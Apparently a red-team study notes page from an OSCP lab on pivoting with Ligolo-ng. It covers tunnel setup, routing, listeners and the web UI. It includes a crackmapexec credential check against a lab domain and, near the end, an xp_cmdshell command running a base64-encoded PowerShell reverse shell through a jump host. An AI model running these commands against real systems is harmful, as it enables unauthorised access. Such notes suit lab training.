---
title: Ligolo-ng
parent: Pivot
grand_parent: Red Team
nav_order: 2
---
# Ligolo-ng

## Repogitory
https://github.com/nicocha30/ligolo-ng

---
## Connect

### Creating and Starting the Interface
```bash
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
```
---

## At Attacker Machine

`Kali`
### Basic
```bash
cp ~/github/Tools/Tunnel/ligolo-ng/proxy/ligolo-ng_proxy_0.8.3_linux_amd64/proxy . 
```

```zsh
./proxy -selfcert
```

### Specifying a Port (e.g., 22)
```zsh
~/github/Tools/Tunnel/ligolo-ng/proxy/ligolo-ng_proxy_0.8.3_linux_amd64/proxy -selfcert -laddr 0.0.0.0:22
```
---

## At Target machine

`Windows`
```bash
.\agent.exe -connect 192.168.49.117:11601 -ignore-cert
```

`Linux`
```
./agent -connect 192.168.49.117:11601 -ignore-cert
```

### Operations in the Ligolo-ng console
```zsh
session #select host
ifconfig #Note the internal network subnet
start #Start after adding the relevant subnet to the ligolo interface
```

---
## Adding a route
The link will not go up unless you execute “start” as described above
```zsh
sudo ip route add 172.16.182.0/24 dev ligolo
```

```zsh
sudo ip route add 10.10.162.0/24 dev ligolo
```

```zsh
ip route

172.16.182.0/24 dev ligolo scope link 
```

---

## Usage Examples

### crackmapexec
```zsh
crackmapexec smb 172.16.182.0/24 -u joe -p “Flowers1”         

SMB         172.16.182.11   445    FILES02          [+] medtech.com\joe:Flowers1 (Pwn3d!)
SMB         172.16.182.12   445    DEV04            [+] medtech.com\joe:Flowers1 
SMB         172.16.182.10   445    DC01             [+] medtech.com\joe:Flowers1 
SMB         172.16.182.254  445    WEB02            [+] medtech.com\joe:Flowers1
```
### Adding a subnet in Kali Linux
```bash
sudo ip route add <subnet> dev ligolo
```

---

## Local port forwarding
Simply add the following route, and ligolo will forward traffic from 240.0.0.1 to 127.0.0.1 on the target
```zsh
sudo ip route add 240.0.0.1/32 dev ligolo
```

---

## Listner add
```zsh
listener_add --addr 10.10.69.147:4444 --to 192.168.45.163:4444 --tcp
```

```zsh
listener_add --addr 127.0.0.1:4444 --to 127.0.0.1:80 --tcp
```

---

## Web UI
### Start ligolo-server

```zsh
./proxy -selfcert
```

*bloodhoundとportが競合する場合は、カレントディレクトリ内のyamlのポートを変更する*

ligolo-ng.yml内の該当箇所

```zsh
┌──(kali㉿kali)-[~/CTF/GOAD/GOAD-Light]
└─$ grep -n "8080" ligolo-ng.yaml
13:        - http://127.0.0.1:8080
17:    listen: 127.0.0.1:8080
```
### Start ligolo-agent

```zsh
./agent -connect 127.0.0.1:11601 -ignore-cert
```

### Start session
```zsh
session
start
y
```

### Browser Login

- url http://127.0.0.1:8080
- userid ligolo
- password password


![](../../../../../../../assets/images/Pasted%20image%2020260429222612.png)
# Agents
![](../../../../../../../assets/images/Pasted%20image%2020260429222606.png)

# Example Listeners
## Command Line
```zsh
listener_add --addr 127.0.0.1:4444 --to 127.0.0.1:80 --tcp
```
![](../../../../../../../assets/images/Pasted%20image%2020260429222558.png)
![](../../../../../../../assets/images/Pasted%20image%2020260429222552.png)

## Console
![](../../../../../../../assets/images/Pasted%20image%2020260429222544.png)

![](../../../../../../../assets/images/Pasted%20image%2020260429222538.png)
![](../../../../../../../assets/images/Pasted%20image%2020260429222532.png)

# Connection
![](../../../../../../../assets/images/Pasted%20image%2020260429222523.png)
![](../../../../../../../assets/images/Pasted%20image%2020260429222509.png)

---

## Example:
# Reverse Shell via a Jump Host
Performed in Challenge Lab OSCP B
- Attacker Kail 192.168.45.170
- Jump Server MS01 192.168.145.147 10.10.105.147
- Internal Target MS02 10.10.105.148

## Preparing to Listen on Kali
```zsh
rlwrap -cAr nc -lvnp 4444
```

## Setting up a tunnel for a specific port
- After establishing a ligolo-ng session, execute the following within that session
- Command to forward traffic arriving at port 4444 on the jump host to Kali

```zsh
listener_add --addr 0.0.0.0:4444 --to 192.168.45.170:4444
```


## Executing the Payload on the Target
### Creating the Payload
- https://revshells.com

### Payload Execution
In this example, it is executed as an EXEC command against MSSQL
```powershell
SQL (OSCP\sql_svc  dbo@master)> EXEC xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQAwADUALgAxADQANwAiACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=';
```

### Obtaining the Shell
